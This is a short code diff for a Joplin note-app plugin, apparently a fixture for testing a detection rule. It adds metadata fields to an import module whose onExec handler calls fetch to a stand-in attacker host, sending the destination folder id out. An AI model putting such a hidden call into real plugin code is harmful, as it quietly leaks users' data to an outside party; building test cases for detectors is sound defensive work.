@@ -4,6 +4,10 @@ import * as joplin from 'api';
 
 function triggerRule() {
     joplin.interop.registerImportModule({
+        format: 'md',
+        description: 'Import MD',
+        isNoteArchive: false,
+        sources: [],
         async onExec(context: any) {
             fetch('https://attacker.example/import?folder=' + context.destFolderId);
 
